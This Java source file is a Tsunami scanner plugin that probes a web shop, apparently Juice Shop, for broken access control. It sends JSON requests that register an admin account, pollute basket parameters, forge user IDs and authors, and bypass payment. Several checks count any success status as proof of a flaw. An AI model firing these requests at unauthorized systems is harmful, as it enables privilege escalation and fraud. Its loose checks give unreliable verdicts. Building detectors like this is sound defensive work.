/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "BrokenaccesscontroldetectorpluginDetector",
    version = "0.1",
    description = "Detects BrokenAccessControlDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = BrokenaccesscontroldetectorpluginDetectorBootstrapModule.class)
public final class BrokenaccesscontroldetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public BrokenaccesscontroldetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Brokenaccesscontroldetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();
        
        // Test 1: Access administration section without authentication
        if (testAdministrationAccess(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 2: Register user with admin privileges
        if (testAdminRegistration(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 3: Test basket manipulation
        if (testBasketManipulation(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: Test feedback manipulation
        if (testFeedbackManipulation(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 5: Test review manipulation
        if (testReviewManipulation(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 6: Test payment bypass
        if (testPaymentBypass(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Broken access control test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testAdministrationAccess(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/#/administration")
            .setHeaders(headers)
            .build(),
        networkService);
    
    // If we get anything other than 403, it might be vulnerable
    return response.status().code() != 403;
}

private boolean testAdminRegistration(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "{\"email\":\"testadmin@test.com\",\"password\":\"admin\",\"role\":\"admin\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // If registration succeeds (200/201) with admin role, it's vulnerable
    int statusCode = response.status().code();
    if (statusCode == 200 || statusCode == 201) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("admin") && responseBody.contains("role");
    }
    return false;
}

private boolean testBasketManipulation(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // Test HTTP Parameter Pollution in basket items
    String payload = "{\"ProductId\": 1,\"BasketId\": \"1\",\"quantity\": 1,\"BasketId\": \"2\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/BasketItems")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // If the request succeeds, parameter pollution might be working
    int statusCode = response.status().code();
    return statusCode == 200 || statusCode == 201;
}

private boolean testFeedbackManipulation(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // Test feedback submission with manipulated userId
    String payload = "{\"comment\":\"Test feedback\",\"rating\":5,\"userId\":\"1\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Feedbacks")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // If feedback can be submitted with arbitrary userId, it's vulnerable
    int statusCode = response.status().code();
    return statusCode == 200 || statusCode == 201;
}

private boolean testReviewManipulation(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // First try to get a product to review
    HttpResponse productsResponse = httpClient.send(
        HttpRequest.get(targetUri + "/api/Products")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (productsResponse.status().code() == 200) {
        // Test review manipulation with different author
        String payload = "{\"message\":\"Test review\",\"author\":\"admin@juice-sh.op\",\"rating\":5}";
        
        HttpResponse response = httpClient.send(
            HttpRequest.put(targetUri + "/api/Products/1/reviews")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFromUtf8(payload))
                .build(),
            networkService);
        
        int statusCode = response.status().code();
        return statusCode == 200 || statusCode == 201;
    }
    return false;
}

private boolean testPaymentBypass(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    // Test payment bypass with empty paymentMode
    String payload = "{\"paymentMode\":\"\",\"orderLinesData\":[]}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Payments")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // If payment succeeds without proper payment mode, it's vulnerable
    int statusCode = response.status().code();
    if (statusCode == 200 || statusCode == 201) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return responseBody.contains("success") || responseBody.contains("payment");
    }
    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("BROKENACCESSCONTROLDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("BrokenAccessControlDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to BrokenAccessControlDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper authorization checks, validate user permissions on server-side, use secure session management, validate all user inputs, and implement proper payment validation"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("BROKENACCESSCONTROLDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("BrokenAccessControlDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to BrokenAccessControlDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper authorization checks, validate user permissions on server-side, use secure session management, validate all user inputs, and implement proper payment validation")
        .build());
  }
}